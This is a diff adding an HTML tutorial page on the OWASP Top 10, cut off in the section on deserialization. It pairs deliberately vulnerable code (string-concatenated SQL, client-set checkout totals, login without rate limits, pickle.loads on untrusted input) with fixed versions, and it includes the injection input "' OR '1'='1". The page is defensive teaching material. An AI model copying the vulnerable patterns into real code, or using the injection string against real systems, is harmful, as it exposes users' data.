@@ -1,0 +1,1746 @@
+<!DOCTYPE html>
+<html class="light" lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   OWASP Top 10: Web Application Security Risks &amp; Defenses
+  </title>
+  <link href="../assets/favicons/owasp.svg" rel="icon" type="image/svg+xml"/>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&amp;display=swap" rel="stylesheet"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css" id="hljs-light" rel="stylesheet"/>
+  <link disabled="" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" id="hljs-dark" rel="stylesheet"/>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/sql.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js">
+  </script>
+  <script>
+   tailwind.config = { darkMode: 'class' }
+  </script>
+  <link href="../assets/styles.css" rel="stylesheet"/>
+ </head>
+ <body class="antialiased transition-colors duration-300 brand-owasp-top-10">
+  <a class="sr-only" href="#main" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">
+   Skip to content
+  </a>
+  <div class="fixed inset-0 bg-black/40 z-30 hidden lg:hidden" id="menu-overlay" onclick="toggleSidebar()">
+  </div>
+  <div class="flex min-h-screen">
+   <aside class="fixed lg:sticky top-0 left-0 h-screen w-72 border-r border-[var(--border)] bg-[var(--panel)] z-40 overflow-y-auto p-6" id="sidebar">
+    <div class="flex items-center gap-3 mb-8">
+     <img alt="OWASP" class="w-10 h-10" src="../assets/favicons/owasp.svg"/>
+     <span class="text-xl font-bold">
+      OWASP Top 10
+     </span>
+    </div>
+    <nav class="space-y-1 text-sm" id="toc">
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#intro">
+      1. Introduction
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#owasp-overview">
+      2. What Is OWASP?
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#broken-access-control">
+      3. Broken Access Control (A01)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#crypto-failures">
+      4. Cryptographic Failures (A02)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#injection">
+      5. Injection (A03)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#insecure-design">
+      6. Insecure Design (A04)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#security-misconfiguration">
+      7. Security Misconfiguration (A05)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#vulnerable-components">
+      8. Vulnerable Components (A06)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#auth-failures">
+      9. Authentication Failures (A07)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#integrity-failures">
+      10. Software &amp; Data Integrity Failures (A08)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#logging-failures">
+      11. Logging &amp; Monitoring Failures (A09)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#ssrf">
+      12. Server-Side Request Forgery (A10)
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#ssdlc">
+      13. Secure SDLC Habits
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#more-real-world">
+      14. More Real-World Breaches
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#extra-risks">
+      15. Risks Beyond the Top 10
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#capstone">
+      16. Capstone Project
+     </a>
+     <a class="toc-link block px-3 py-2 rounded-md text-[var(--muted)] hover:bg-black/5 dark:hover:bg-white/5 transition" href="#quiz">
+      17. Knowledge Check
+     </a>
+    </nav>
+   </aside>
+   <div class="flex-1 min-w-0">
+    <header class="lg:hidden flex items-center justify-between px-6 py-4 border-b border-[var(--border)] bg-[var(--panel)] sticky top-0 z-30">
+     <button aria-label="Open menu" class="p-2 rounded-lg border border-[var(--border)]" onclick="toggleSidebar()">
+      <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+       <path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round" stroke-linejoin="round">
+       </path>
+      </svg>
+     </button>
+     <button aria-label="Toggle theme" class="p-2 rounded-lg border border-[var(--border)] hover:bg-black/5 dark:hover:bg-white/5 transition" id="theme-toggle">
+      <svg class="w-5 h-5" fill="none" id="moon" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+       <path d="M21 12.79A9 9 0 1111.21 3a7 7 0 009.79 9.79z" stroke-linecap="round" stroke-linejoin="round">
+       </path>
+      </svg>
+      <svg class="w-5 h-5 hidden" fill="none" id="sun" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+       <circle cx="12" cy="12" r="5">
+       </circle>
+       <path d="M12 1v2m0 18v2M4.22 4.22l1.42 1.42m12.72 12.72l1.42 1.42M1 12h2m18 0h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42" stroke-linecap="round" stroke-linejoin="round">
+       </path>
+      </svg>
+     </button>
+    </header>
+    <main class="max-w-4xl mx-auto px-6 py-10" id="main">
+     <section class="mb-16" id="intro">
+      <div class="flex items-center gap-4 mb-6">
+       <div class="p-3 rounded-2xl bg-[var(--card)] border border-[var(--border)]">
+        <img alt="OWASP shield" class="w-14 h-14" src="../assets/favicons/owasp.svg"/>
+       </div>
+       <div>
+        <p class="text-sm font-semibold text-[var(--brand-light)] uppercase tracking-wider">
+         Security Track
+        </p>
+        <h1 class="text-3xl sm:text-4xl font-extrabold">
+         OWASP Top 10
+        </h1>
+       </div>
+      </div>
+      <p class="text-lg text-[var(--muted)] leading-relaxed mb-4">
+       The OWASP Top 10 is the world's most authoritative list of the most critical web application security risks.
+              Every backend, frontend, DevOps, and full-stack engineer should understand these vulnerabilities because the same
+              mistakes keep costing real companies real money &mdash; and real user trust.
+      </p>
+      <p class="text-[var(--muted)] leading-relaxed">
+       In this tutorial you will learn each risk with concrete code examples, famous real-world breaches, and practical
+              defenses you can implement immediately in Node.js, Python, SQL, Docker, and CI/CD pipelines.
+      </p>
+     </section>
+     <section class="mb-16" id="owasp-overview">
+      <h2 class="text-2xl font-bold mb-4">
+       What Is OWASP?
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       OWASP stands for the
+       <strong class="text-[var(--ink)]">
+        Open Worldwide Application Security Project
+       </strong>
+       . It is a nonprofit foundation
+              that produces free, open-source security standards, tools, and documentation. The OWASP Top 10 is updated every
+              few years by a global team of security researchers based on real production data.
+      </p>
+      <div class="overflow-x-auto rounded-xl border border-[var(--border)]">
+       <table class="w-full text-sm">
+        <thead class="bg-[var(--panel)]">
+         <tr>
+          <th class="text-left p-3 border-b border-[var(--border)]">
+           Rank
+          </th>
+          <th class="text-left p-3 border-b border-[var(--border)]">
+           Risk (2021)
+          </th>
+          <th class="text-left p-3 border-b border-[var(--border)]">
+           One-line summary
+          </th>
+         </tr>
+        </thead>
+        <tbody class="divide-y divide-[var(--border)]">
+         <tr>
+          <td class="p-3">
+           A01
+          </td>
+          <td class="p-3 font-semibold">
+           Broken Access Control
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Users can act outside their intended permissions.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A02
+          </td>
+          <td class="p-3 font-semibold">
+           Cryptographic Failures
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Sensitive data is exposed or stored/transmitted without protection.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A03
+          </td>
+          <td class="p-3 font-semibold">
+           Injection
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Untrusted data is sent to an interpreter as part of a command or query.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A04
+          </td>
+          <td class="p-3 font-semibold">
+           Insecure Design
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           The application architecture itself lacks security controls.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A05
+          </td>
+          <td class="p-3 font-semibold">
+           Security Misconfiguration
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Default settings, missing patches, or verbose errors leak data.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A06
+          </td>
+          <td class="p-3 font-semibold">
+           Vulnerable and Outdated Components
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Libraries, frameworks, or OS packages with known CVEs.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A07
+          </td>
+          <td class="p-3 font-semibold">
+           Authentication Failures
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Weak login flows let attackers impersonate users.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A08
+          </td>
+          <td class="p-3 font-semibold">
+           Software and Data Integrity Failures
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Untrusted updates, deserialization, or CI/CD tampering.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A09
+          </td>
+          <td class="p-3 font-semibold">
+           Logging &amp; Monitoring Failures
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           Security events go unnoticed because logs are missing or ignored.
+          </td>
+         </tr>
+         <tr>
+          <td class="p-3">
+           A10
+          </td>
+          <td class="p-3 font-semibold">
+           Server-Side Request Forgery (SSRF)
+          </td>
+          <td class="p-3 text-[var(--muted)]">
+           The server fetches a URL supplied by the user without validation.
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </div>
+     </section>
+     <section class="mb-16" id="broken-access-control">
+      <h2 class="text-2xl font-bold mb-4">
+       A01: Broken Access Control
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Access control enforces rules like "users can only see their own orders." When that enforcement is missing,
+              attackers can read or modify other users' data simply by changing an ID in a URL or API request.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        In 2019, a Facebook bug let users see other people's private Messenger chats because a server-side access check
+                was missing when fetching message threads by ID. An attacker only needed to increment a numeric ID.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Vulnerable code
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ❌ VULNERABLE: trusts the client-supplied userId
+app.get("/api/orders/:id", async (req, res) =&gt; {
+  const order = await db.query("SELECT * FROM orders WHERE id = $1", [
+    req.params.id,
+  ]);
+  res.json(order);
+});</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Secure code
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE: enforce ownership server-side
+app.get("/api/orders/:id", authenticate, async (req, res) =&gt; {
+  const order = await db.query(
+    "SELECT * FROM orders WHERE id = $1 AND user_id = $2",
+    [req.params.id, req.user.id],
+  );
+  if (!order.rows[0]) return res.status(404).json({ error: "Not found" });
+  res.json(order.rows[0]);
+});</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Deny by default; allow access only after explicit authorization checks.
+       </li>
+       <li>
+        Never trust the URL alone. Always re-check ownership on every request.
+       </li>
+       <li>
+        Use role-based access control (RBAC) for admin vs. user capabilities.
+       </li>
+       <li>
+        Log access-control failures and alert on repeated attempts.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="crypto-failures">
+      <h2 class="text-2xl font-bold mb-4">
+       A02: Cryptographic Failures
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       This category covers transmitting or storing sensitive data in cleartext, using weak or deprecated algorithms,
+              or mishandling encryption keys. It is the modern name for what used to be called "Sensitive Data Exposure."
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        Equifax's 2017 breach exposed 147 million records partly because attackers found unencrypted personal data
+                after exploiting an outdated Apache Struts library. Storing data in cleartext magnified the impact.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Wrong: cleartext storage and weak hashing
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-python"># ❌ VULNERABLE
+def store_user(email, password, ssn):
+    db.execute(
+        "INSERT INTO users (email, password, ssn) VALUES (?, ?, ?)",
+        (email, password, ssn),
+    )
+# Password = 'password123' stored literally.</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Right: hashing, encryption, TLS
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-python"># ✅ SECURE
+import bcrypt
+from cryptography.fernet import Fernet
+SECRET_KEY = Fernet.generate_key()
+fernet = Fernet(SECRET_KEY)
+def store_user(email, password, ssn):
+    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
+    encrypted_ssn = fernet.encrypt(ssn.encode()).decode()
+    db.execute(
+        "INSERT INTO users (email, password_hash, ssn_encrypted) VALUES (?, ?, ?)",
+        (email, hashed, encrypted_ssn),
+    )</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Use TLS 1.2+ everywhere (HTTPS, database connections, internal service calls).
+       </li>
+       <li>
+        Hash passwords with bcrypt/Argon2/scrypt &mdash; never MD5 or SHA1 alone.
+       </li>
+       <li>
+        Encrypt PII at rest; keep keys in a KMS, not in source code.
+       </li>
+       <li>
+        Disable caching for pages containing sensitive data with cache-control headers.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="injection">
+      <h2 class="text-2xl font-bold mb-4">
+       A03: Injection
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Injection happens when an application passes untrusted input directly into a command, query, or template.
+              SQL injection is the most famous form, but NoSQL, OS command, LDAP, and template injection are also common.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        In 2008, Heartland Payment Systems lost 130 million card numbers after attackers used SQL injection against
+                a web application and planted sniffers on the network. It was one of the costliest breaches in history.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Vulnerable SQL
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ❌ VULNERABLE: string concatenation
+app.get("/api/users", async (req, res) =&gt; {
+  const q = req.query.name;
+  const result = await db.query(`SELECT * FROM users WHERE name = '${q}'`);
+  res.json(result.rows);
+});
+// Attacker sends: name=' OR '1'='1
+// Result returns every user in the database.</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Secure SQL with parameterized queries
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE: parameters are bound, never interpreted
+app.get("/api/users", async (req, res) =&gt; {
+  const result = await db.query("SELECT * FROM users WHERE name = $1", [
+    req.query.name,
+  ]);
+  res.json(result.rows);
+});</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Secure ORM example
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-python"># ✅ SECURE with SQLAlchemy ORM
+from sqlalchemy import select
+from models import User
+@app.get("/api/users")
+def search_users(name: str):
+    stmt = select(User).where(User.name == name)
+    return session.execute(stmt).scalars().all()</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Always use parameterized queries or ORM parameter binding.
+       </li>
+       <li>
+        Validate, sanitize, and whitelist input on the server.
+       </li>
+       <li>
+        Use the principle of least privilege for database accounts.
+       </li>
+       <li>
+        Avoid passing user input to shell commands or eval().
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="insecure-design">
+      <h2 class="text-2xl font-bold mb-4">
+       A04: Insecure Design
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Insecure design is a broad category for missing or ineffective security controls in the application design itself.
+              It is not a bug in a single line &mdash; it is a flaw in how the feature was conceived.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        In 2022, several ride-sharing apps let users sign up with fake driver accounts because the design allowed
+                the same API to both register a driver and approve that driver. There was no separation between data entry
+                and business approval.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Insecure design: price sent from client
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ❌ VULNERABLE: the client sets the total
+app.post("/api/checkout", async (req, res) =&gt; {
+  const { items, total } = req.body;
+  await chargeCard(req.user.cardToken, total); // $0.01 if attacker wants
+  await db.query("INSERT INTO orders ...", [items, total]);
+  res.json({ ok: true });
+});</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Secure design: server re-calculates price
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE: authoritative price comes from the database
+app.post("/api/checkout", authenticate, rateLimit, async (req, res) =&gt; {
+  const items = await validateCartItems(req.body.itemIds); // fetch real SKUs &amp; prices
+  const total = items.reduce((sum, i) =&gt; sum + i.price * i.qty, 0);
+  if (Math.abs(total - req.body.clientTotal) &gt; 0.01) {
+    return res.status(400).json({ error: "Price mismatch" });
+  }
+  await chargeCard(req.user.cardToken, total);
+  await db.query("INSERT INTO orders ...", [items, total]);
+  res.json({ orderId });
+});</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Treat client-submitted values as untrusted hints, never authoritative facts.
+       </li>
+       <li>
+        Use threat modeling (STRIDE) before building high-risk features.
+       </li>
+       <li>
+        Add business limits and rate limits by design, not as afterthoughts.
+       </li>
+       <li>
+        Separate sensitive workflows (e.g., write approval vs. read access).
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="security-misconfiguration">
+      <h2 class="text-2xl font-bold mb-4">
+       A05: Security Misconfiguration
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       This category covers default passwords, open cloud buckets, unnecessary features enabled, verbose error messages,
+              missing security headers, and unpatched software. It is one of the easiest vulnerabilities to exploit.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        Capital One's 2019 breach affected 100 million customers when a misconfigured AWS WAF/SSRF chain let an
+                attacker list S3 buckets. A single firewall rule gap plus a metadata service issue opened the door.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Express without security headers
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ❌ VULNERABLE: default headers and stack traces
+const app = require("express")();
+app.get("/api/error", (req, res) =&gt; {
+  throw new Error(req.query.msg);
+});
+// Stack trace + SQL details leak to the browser.</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Secure Express setup
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE
+const express = require("express");
+const helmet = require("helmet");
+const app = express();
+app.use(
+  helmet({
+    contentSecurityPolicy: {
+      directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] },
+    },
+    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
+  }),
+);
+app.use((err, req, res, next) =&gt; {
+  console.error(err);
+  res.status(500).json({ error: "Internal server error" }); // no stack trace
+});</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Docker hardening example
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-dockerfile"># ✅ SECURE Dockerfile habits
+FROM node:20-alpine
+RUN addgroup -g 1001 -S appgroup &amp;&amp; adduser -u 1001 -S appuser -G appgroup
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+COPY . .
+USER appuser
+EXPOSE 3000
+CMD ["node", "server.js"]</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Remove default accounts, sample apps, and unused features.
+       </li>
+       <li>
+        Send security headers (Helmet, CSP, HSTS, X-Content-Type-Options).
+       </li>
+       <li>
+        Return generic error messages in production; log details server-side.
+       </li>
+       <li>
+        Run containers as non-root and keep images minimal.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="vulnerable-components">
+      <h2 class="text-2xl font-bold mb-4">
+       A06: Vulnerable and Outdated Components
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Most applications depend on hundreds of open-source packages. When one has a known vulnerability and is not
+              updated, attackers can exploit it before developers even realize the risk.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        The 2017 Equifax breach began with a known remote-code-execution vulnerability in Apache Struts (CVE-2017-5638).
+                A patch had been available for months, but the component had not been updated.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Scan and patch dependencies
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-bash"># ✅ Node.js dependency audit
+npm audit
+npm audit fix
+# Break the build on critical vulnerabilities
+npm audit --audit-level=moderate
+# Python
+pip-audit
+safety check
+# Container images
+snyk container test myapp:latest
+</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Dependabot / CI pipeline
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-yaml"># .github/workflows/security.yml
+name: Security Scan
+on: [push, pull_request]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm ci
+      - run: npm audit --audit-level=moderate
+      - run: npx eslint . --ext .js,.ts
+      - uses: github/codeql-action/init@v3
+      - uses: github/codeql-action/analyze@v3</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Maintain a software bill of materials (SBOM) for every service.
+       </li>
+       <li>
+        Enable Dependabot, Renovate, or Snyk for automatic update PRs.
+       </li>
+       <li>
+        Remove unused dependencies &mdash; they still show up in scans and attack surface.
+       </li>
+       <li>
+        Pin to exact versions in production and verify checksums.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="auth-failures">
+      <h2 class="text-2xl font-bold mb-4">
+       A07: Authentication Failures
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Authentication failures cover weak password rules, brute-forceable login forms, weak session tokens, missing MFA,
+              and insecure password recovery. If an attacker can log in as someone else, every other control can fail.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        In 2020, Twitter's admin panel was compromised through a phone-based social-engineering attack that bypassed
+                MFA. While MFA is not invincible, the incident showed how critical authentication flows are to platform integrity.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Brute-forceable login
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ❌ VULNERABLE: no rate limiting or lockout
+app.post("/api/login", async (req, res) =&gt; {
+  const user = await db.query("SELECT * FROM users WHERE email = $1", [
+    req.body.email,
+  ]);
+  if (await bcrypt.compare(req.body.password, user.password_hash)) {
+    return res.json({ token: jwt.sign({ sub: user.id }, SECRET) });
+  }
+  res.status(401).json({ error: "Bad credentials" });
+});</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Secure login with rate limiting and MFA hooks
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE
+const rateLimit = require("express-rate-limit");
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  standardHeaders: true,
+  message: { error: "Too many attempts. Try again later." },
+});
+app.post("/api/login", loginLimiter, async (req, res) =&gt; {
+  const user = await db.query("SELECT * FROM users WHERE email = $1", [
+    req.body.email,
+  ]);
+  if (!user || !(await bcrypt.compare(req.body.password, user.password_hash))) {
+    await logFailedLogin(req.body.email, req.ip);
+    return res.status(401).json({ error: "Invalid credentials" });
+  }
+  if (user.mfaEnabled) {
+    return res.json({ step: "mfa", tempToken: issueTempToken(user.id) });
+  }
+  res.json({ token: issueJwt(user) });
+});</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Enforce strong passwords and offer MFA (TOTP, WebAuthn, or passkeys).
+       </li>
+       <li>
+        Rate-limit login, registration, and password-reset endpoints.
+       </li>
+       <li>
+        Use short-lived JWTs, secure httpOnly cookies, and rotate secrets.
+       </li>
+       <li>
+        Never expose whether an email is registered through error messages.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="integrity-failures">
+      <h2 class="text-2xl font-bold mb-4">
+       A08: Software &amp; Data Integrity Failures
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Integrity failures occur when applications rely on plugins, libraries, or data from untrusted sources without
+              verification. The SolarWinds attack is the textbook example of a supply-chain integrity failure.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        The 2020 SolarWinds Orion breach showed how dangerous a compromised software update can be. Attackers inserted
+                malicious code into a signed build that was distributed to 18,000 organizations, including government agencies.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Unsafe deserialization in Python
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-python"># ❌ VULNERABLE: pickle can execute arbitrary code during loading
+import pickle
+def load_user_session(data):
+    return pickle.loads(data)  # attacker sends a malicious payload</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Safe alternative: signed JSON or protobuf
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-python"># ✅ SECURE: JSON + HMAC signature
+import json
+import hmac
+import hashlib
+SECRET = b"your-256-bit-key"
+def sign(data: bytes) -&gt; str:
+    return hmac.new(SECRET, data, hashlib.sha256).hexdigest()
+def load_user_session(signed_data: str) -&gt; dict:
+    signature, payload = signed_data.split(":", 1)
+    if not hmac.compare_digest(signature, sign(payload.encode())):
+        raise ValueError("Invalid signature")
